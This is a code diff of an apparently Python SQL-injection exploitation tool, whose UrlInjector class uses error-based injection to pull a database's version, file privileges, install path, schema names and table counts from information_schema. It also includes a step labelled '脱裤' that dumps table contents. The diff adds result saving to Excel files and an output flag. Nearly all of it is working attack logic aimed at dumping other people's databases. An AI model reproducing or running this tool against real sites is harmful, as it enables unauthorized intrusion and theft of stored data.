@@ -13,7 +13,9 @@ from savedata_xlsx import SaveXlsx
 
 # 初始化全局参数
 Global_UserData = userdata.Global_UserData
+Global_XlsSavePath = Global_UserData['XlsSavePath']
 Global_Headers = {'User-Agent': Global_UserData['User-Agent']}
+
 
 class UrlInjector(object):
     _url_info = None
@@ -104,12 +106,16 @@ class UrlInjector(object):
         pass
 
     # noinspection PyMethodMayBeStatic
-    def PublicExp(self, payload: dict):
+    def PublicExp(self, payload: dict, bPrintDict=True):
         """
-        :param payload:用于注入点的字典
+        函数： 利用漏洞获取数据库信息
+
+        :param payload: 用于注入点的字典
+        :param bPrintDict: 用于标记是否格式化输出数据库信息
         :return: 返回T/F,表示是否成功利用
         """
 
+        # 如果不存在注入漏洞，则返回
         if len(payload) == 0:
             return False
         mode = url0 = None
@@ -117,6 +123,8 @@ class UrlInjector(object):
             mode, url0 = x, payload[x]
         print(f'>开始漏洞利用\t{mode}【{url0}】')
         if mode == '错误注入':
+            self._url_info['注入方式'] = mode
+
             # 构造注入语句
             url = url0
 
@@ -127,17 +135,15 @@ class UrlInjector(object):
             dict_sql['数据库版本'] = GetResult_ERROR(url, '@@VERSION')
             dict_sql['数据库文件权限'] = GetResult_ERROR(url, '@@secure_file_priv')
             dict_sql['数据库安装路径'] = GetResult_ERROR(url, '@@basedir')
-            dict_sql['本数据库名'] = GetResult_ERROR(url, 'database()')
-            # tmp_db_name = None if dict_sql['本数据库名'] is None \
-            #     else dict_sql['本数据库名']
 
-            dict_sql['系统数据库总数'] = GetResult_ERROR(
-                url, 'SELECT COUNT(*) FROM information_schema.schemata')
             dict_sql['系统数据库索引'] = GetResult_ERROR(
                 url, 'SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.schemata')
-
+            dict_sql['系统数据库总数'] = GetResult_ERROR(
+                url, 'SELECT COUNT(*) FROM information_schema.schemata')
             dict_sql['系统表格总数'] = GetResult_ERROR(
                 url, 'SELECT COUNT(*) FROM information_schema.TABLES')
+
+            dict_sql['本数据库名'] = GetResult_ERROR(url, 'database()')
             dict_sql['本表格总数'] = GetResult_ERROR(
                 url, 'SELECT count(*) FROM information_schema.STATISTICS '
                      'WHERE TABLE_SCHEMA=database()')
@@ -148,6 +154,7 @@ class UrlInjector(object):
             if '脱裤_数据库信息' in self._url_info and \
                     '本表格索引' in dict_sql:
                 print(f">需要脱裤\t{dict_sql['本表格索引']}")
+
                 self._url_info['脱裤_数据库数据'] = {}
                 SelectTables(
                     url0,
@@ -156,12 +163,25 @@ class UrlInjector(object):
                     self._url_info['脱裤_数据库数据']
                 )
 
-            pp.pprint(self._url_info)
+            if bPrintDict:
+                pp.pprint(self._url_info)
             return True
         pass
 
     def PublicSaveXlsx(self):
-        SaveXlsx()
+        """
+        函数： 用于保存xlsx文件至目录
+
+        :return: T/F=是否保存成功
+        """
+
+        # 格式化文件名
+        _dict = self._url_info
+        if '注入方式' not in _dict:
+            return False
+        filepath = f"{Global_UserData['XlsSavePath']}" \
+                   f"{_dict['注入方式']}.xlsx"
+        SaveXlsx(filepath, self._url_info)
         pass
 
     pass
